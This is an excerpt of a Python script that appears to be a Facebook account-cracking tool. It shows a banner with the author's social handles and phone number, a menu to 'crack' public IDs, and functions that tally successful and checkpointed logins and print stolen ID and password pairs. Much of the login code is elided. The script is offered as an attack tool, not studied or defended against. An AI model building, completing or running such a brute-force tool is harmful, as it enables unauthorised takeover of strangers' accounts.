...
\33[1;33m█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
\33[1;33m█  \33[mGithub: https://github.com/Libya.Pro
\33[1;33m█  \33[mFacebook: Ahmedalzwage 
\33[1;33m█  \33[mWhatsApp: +218921762445
\33[1;33m█  \33[mTools : \33[1;33mGg
\33[1;33m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
"""%(h))
...
def menu(my_name):
	...
	print("""%s ●▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬● """%(h))
	print("""%s \33[m[01] \33[1;33mCRACK DARI ID PUBLIK """%(h))
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s [Libya] %s/%s ~_~ [OK:%s] ^_^ [CP:%s] ~_~ %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					print('\n')
					print(f"\33[1;33m╚══[CP]\33[1;33m{idf}\33[m•\33[1;33m{pw}\n")
					cp+=1
				break
...
def crack2(idf,pwv):
	...
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s [Libya] %s/%s ~_~ [OK*%s | CP*%s ~_~ %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
